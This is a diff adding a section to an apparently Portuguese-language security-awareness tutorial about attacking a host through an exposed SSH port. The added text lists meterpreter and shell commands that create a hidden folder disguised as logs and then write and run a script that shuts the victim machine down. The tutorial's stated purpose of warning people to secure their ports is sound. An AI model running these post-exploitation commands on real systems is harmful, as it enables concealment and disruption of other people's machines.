@@ -50,3 +50,29 @@ que fiz com msfvenom, enviei usando o protocolo scp (nesse cenário, eu já tinh
 ### objetivo
 
 o intuito aqui é mostrar como alguém pode fazer mal a você simplesmente por achar uma porta ssh (22) exposta, revise sua portas, mantenha segurança
+
+### e agora?
+
+a partir daqui, o invasor pode até mesmo executar comandos .sh, 
+exemplo inofensivo:
+
+(no meterpreter)
+🖥 cd /home/user/
+
+// pra voltar ao início
+
+🖥 mkdir .logs
+
+🖥 cd .logs
+
+// pra criar uma pasta oculta disfarçada de logs e entrar nela
+
+🖥 shell
+
+🖥 touch off.sh
+
+🖥 echo shutdown now > off.sh
+
+🖥 ./off.sh
+
+// o atacante criou um arquivo executável que desliga o pc e roda da máquina dele
